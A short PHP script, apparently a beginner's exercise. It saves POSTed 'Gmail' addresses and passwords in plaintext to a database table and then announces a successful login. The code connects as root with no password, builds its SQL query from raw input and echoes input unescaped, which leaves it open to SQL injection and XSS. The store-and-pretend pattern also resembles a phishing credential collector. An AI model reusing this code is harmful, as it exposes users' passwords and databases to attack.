<?php

$conn = mysqli_connect("localhost","root","","belajarphp");

    $Gmail= $_POST["Gmail"];
    $pass= $_POST["pass"];

    $data = "INSERT INTO lgg VALUES('$Gmail','$pass')";

    mysqli_query($conn, $data);
    alert("Loggin Berhasil");

    function alert($msg) {
    echo "<script type='text/javascript'>alert('$msg');</script>";
}

    echo $Gmail

?>